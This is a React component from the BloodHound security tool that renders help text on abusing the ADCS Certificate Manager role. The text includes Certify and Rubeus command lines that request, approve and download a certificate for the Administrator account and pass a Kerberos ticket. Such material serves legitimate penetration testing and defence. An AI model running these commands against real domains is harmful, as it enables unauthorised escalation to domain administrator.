// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Link, Typography } from '@mui/material';
import { FC } from 'react';

const Abuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                An attacker can identify ADCS escalation opportunities where manager approval on the certificate
                template prevents direct abuse, but leverage the Certificate Manager role to approve the pending
                certificate request. An example of abuse is covered here.
            </Typography>
            <Typography variant='body2'>
                Alternatively, an attacker can abuse the Certificate Manager role to add an extension to pending
                certificates, which can be abused to add a group-linked issuance policy in environments using
                Authentication Mechanism Assurance (AMA). See{' '}
                <Link
                    target='_blank'
                    rel='noopener'
                    href='https://github.com/GhostPack/Certify/wiki/4-%E2%80%90-Escalation-Techniques#managecertificates'>
                    Certify wiki - Escalation Techniques - ManageCertificates
                </Link>{' '}
                for details.
            </Typography>
            <Typography variant='body2'>A certificate can be requested with Certify (v2.0):</Typography>
            <Typography component={'pre'}>
                {
                    'Certify.exe request --ca ca01.corp.local\\CORP-CA01-CA --template CustomUser --upn Administrator --sid S-1-5-21-976219687-1556195986-4104514715-500'
                }
            </Typography>
            <Typography variant='body2'>Check the printed private key and the request ID.</Typography>
            <Typography variant='body2'>Approve the certificate request by the request ID:</Typography>
            <Typography component={'pre'}>
                {'Certify.exe manage-ca --ca ca01.corp.local\\CORP-CA01-CA --issue-id 1337'}
            </Typography>
            <Typography variant='body2'>Download the certificate and get the pfx base-64:</Typography>
            <Typography component={'pre'}>
                {
                    'Certify.exe request-download --ca ca01.corp.local\\CORP-CA01-CA --id 1337 --private-key LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQ0KT...'
                }
            </Typography>
            <Typography variant='body2'>Authenticate with the certificate using Rubeus:</Typography>
            <Typography component={'pre'}>
                {
                    'Rubeus.exe asktgt /user:Administrator /certificate:MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh... /ptt'
                }
            </Typography>
        </>
    );
};

export default Abuse;
